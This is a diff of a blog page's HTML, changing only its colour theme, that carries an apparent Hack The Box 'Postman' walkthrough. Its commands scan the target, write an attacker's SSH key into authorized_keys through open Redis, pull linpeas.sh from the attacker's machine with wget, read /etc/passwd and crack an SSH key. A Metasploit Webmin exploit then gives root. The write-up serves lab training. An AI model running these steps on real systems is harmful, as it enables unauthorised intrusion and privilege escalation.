@@ -52,11 +52,17 @@ While I wait for this to be finished I’ll start a full nmap scan.
     
       
       
-      <link rel="stylesheet" href="https://ajdin.io/css/coder.min.25dead06d06a3a86c2ff00e89506994da7e12f76d83f8cd22a40b144dc7ff1bd.css" integrity="sha256-Jd6tBtBqOobC/wDolQaZTafhL3bYP4zSKkCxRNx/8b0=" crossorigin="anonymous" media="screen" />
+      <link rel="stylesheet" href="https://ajdin.io/css/coder.min.4a28856a95e3501277551f73ab1c016dda3b5fd8733a791aedf596ee168b778e.css" integrity="sha256-SiiFapXjUBJ3VR9zqxwBbdo7X9hzOnka7fWW7haLd44=" crossorigin="anonymous" media="screen" />
     
 
     
 
+    
+      
+        
+        
+        <link rel="stylesheet" href="https://ajdin.io/css/coder-dark.min.329d0cb78d7aa737352ab5e9c025b96047573198980c0de02716d2def518e325.css" integrity="sha256-Mp0Mt416pzc1KrXpwCW5YEdXMZiYDA3gJxbS3vUY4yU=" crossorigin="anonymous" media="screen" />
+      
     
 
     
@@ -73,7 +79,9 @@ While I wait for this to be finished I’ll start a full nmap scan.
 
   
   
-  <body class="colorscheme-light">
+    
+  
+  <body class="colorscheme-dark">
     <main class="wrapper">
       <nav class="navigation">
   <section class="container">
@@ -164,15 +172,15 @@ While I wait for this to be finished I’ll start a full nmap scan.
 
         <h2 id="reconnaissance">Reconnaissance</h2>
 <p>Let’s run a quick nmap scan as always.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#60a0b0;font-style:italic"># nmap -sV -sC -O -oA nmap/initial 10.10.10.160</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#999;font-style:italic"># nmap -sV -sC -O -oA nmap/initial 10.10.10.160</span>
 </code></pre></div><p>Short explanation:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">-sV Version detection
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">-sV Version detection
 -sC Script scan
 -O  Enable OS detection 
 -oA Output to all formats
 </code></pre></div><p>For a more detailed explanation <a href="https://explainshell.com/explain?cmd=nmap+-sV+-sC+-O+-oA+nmap%2Finitial+10.10.10.160#">click here</a>.</p>
 <p>While I wait for this to be finished I’ll start a full nmap scan.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#60a0b0;font-style:italic"># nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#999;font-style:italic"># nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160</span>
 </code></pre></div><p><img src="https://ajdin.io/htb/postman/nmap_initial.png" alt="nmap initial"></p>
 <p>As usual we have port 22 and port 80 running, but here we also have http protocol running on port 10000, let’s enumerate on those pages.</p>
 <p><img src="https://ajdin.io/htb/postman/port80.png" alt="port80"></p>
@@ -180,7 +188,7 @@ While I wait for this to be finished I’ll start a full nmap scan.
 <p>Now on the second server I have to add a “s” to my http request so I can access that.</p>
 <p><img src="https://ajdin.io/htb/postman/port10000_2.png" alt="port80"></p>
 <p>I’ll also start up gobuster. On port 10000 every page link loads the same login so gobuster doesn’t help us there. Let’s run it on port 80.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.160 -x php,html -t <span style="color:#40a070">100</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.160 -x php,html -t <span style="color:#3677a9">100</span>
 </code></pre></div><p><img src="https://ajdin.io/htb/postman/gobuster.png" alt="gobuster"></p>
 <p>Now I felt kinda lost so I looked into what did the full nmap scan find.</p>
 <p><img src="https://ajdin.io/htb/postman/nmap_full.png" alt="nmap full"></p>
@@ -191,40 +199,40 @@ While I wait for this to be finished I’ll start a full nmap scan.
 <p>The Redis security model is: “it’s totally insecure to let untrusted clients access the system, please protect it from the outside world yourself”.</p>
 </blockquote>
 <p>So we’re on the right track. The developer guides us for the next steps on how to exploit this. Using <code>telnet</code> we can see now that we can connect to the machine easily:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ telnet 10.10.10.160 <span style="color:#40a070">6379</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ telnet 10.10.10.160 <span style="color:#3677a9">6379</span>
 </code></pre></div><p>We don’t have a real shell here but we can write some files. We’ll write our own ssh keys. Let’s generate them.</p>
 <p><img src="https://ajdin.io/htb/postman/ssh_keygen.png" alt="nmap full"></p>
 <p>We will push the key and pad it before and after. Why? Well we’ll push it to Redis memory and then flush the memory to a file. The memory will contain a lot of garbage and we’re hoping ssh will parse the file, ignore the garbage and correctly read our key.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#666">(</span><span style="color:#007020">echo</span> -e <span style="color:#4070a0">&#34;\n\n&#34;</span>; cat id_rsa.pub; <span style="color:#007020">echo</span> -e <span style="color:#4070a0">&#34;\n\n&#34;</span><span style="color:#666">)</span> &gt; foo.txt
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ (<span style="color:#24909d">echo</span> -e <span style="color:#ed9d13">&#34;\n\n&#34;</span>; cat id_rsa.pub; <span style="color:#24909d">echo</span> -e <span style="color:#ed9d13">&#34;\n\n&#34;</span>) &gt; foo.txt
 </code></pre></div><p>Now foo.txt is just our public key but with newlines. We can write this string inside the memory of Redis using <code>redis-cli</code>:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ redis-cli -h 10.10.10.160 flushall
-$ cat foo.txt | redis-cli -h 10.10.10.160 -x <span style="color:#007020">set</span> crackit
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ redis-cli -h 10.10.10.160 flushall
+$ cat foo.txt | redis-cli -h 10.10.10.160 -x <span style="color:#24909d">set</span> crackit
 </code></pre></div><p>Looks good. How to dump our memory content into the <code>authorized_keys</code> file? You can see what have I done in picture below.</p>
 <p><img src="https://ajdin.io/htb/postman/redis.png" alt="redis"></p>
 <p>Now that we’ve got a shell, we can see by running</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/passwd
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/passwd
 </code></pre></div><p>that we have to gain access to Matt’s account.</p>
 <p>We can’t run anything as sudo and we don’t belong in any special groups. I searched the redis dir but there wasn’t anything we could work with, I went into <code>/var</code> and checked every folder and again, nothing we can work with. Let’s pull the big guns out. Big guns being LinPEAS. Let’s transfer them onto the server.</p>
 <p>Clone the repo to your machine, enter the <code>/linPEAS dir</code> and start an http server from there. I used port 1114.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo python -m SimpleHTTPServer <span style="color:#40a070">1114</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo python -m SimpleHTTPServer <span style="color:#3677a9">1114</span>
 </code></pre></div><p>Now, navigate to <code>/tmp</code> and create a dir there and cd into it (e.g. <code>/tmp/1234</code>), then grab the file from the machine.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget &lt;your ip here&gt;:1114/linpeas.sh
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget &lt;your ip here&gt;:1114/linpeas.sh
 </code></pre></div><p>Now I ran the script and spent some time looking at the output. This took some time but there is a <code>id_rsa.bak</code> file.</p>
 <p><img src="https://ajdin.io/htb/postman/id_rsa_bak.png" alt="id rsa bak"></p>
 <h3 id="cracking-ssh-key-with-john">Cracking ssh key with John</h3>
 <p>Simply pipe this into ssh2john.py and crack it with the rockyou.txt wordlist.</p>
 <p><img src="https://ajdin.io/htb/postman/john.png" alt="john"></p>
 <p>I tried to ssh into the server with this key but no success. So I connected again as redis and ran</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ su Matt
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ su Matt
 </code></pre></div><p>And that’s how I got user</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Matt@Postman:~$ cat user.txt 
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Matt@Postman:~$ cat user.txt 
 517ad...
 </code></pre></div><h2 id="getting-root">Getting root</h2>
 <p>Getting root is pretty easy, I just logged into webmin with <code>Matt</code> and <code>computer2008</code>. In there I couldn’t do anything, but we can see a notification that we have to update the software.</p>
 <h3 id="webmin-privilege-escalation">Webmin privilege escalation</h3>
 <p>I found an exploit on Metasploit and used it. Below are highlighted the options which are changed. Make sure to switch the payload as the default one didn’t work. I always have success in using the python one.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> &gt; show payloads
- &gt; <span style="color:#007020">set</span> payload &lt;payload here&gt;
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> &gt; show payloads
+ &gt; <span style="color:#24909d">set</span> payload &lt;payload here&gt;
 </code></pre></div><p><img src="https://ajdin.io/htb/postman/metasploit.png" alt="metasploit"></p>
 <p>After this you can simply type <code>exploit</code> and you should have a shell as root and you can <code>cat root.txt</code>.</p>
 
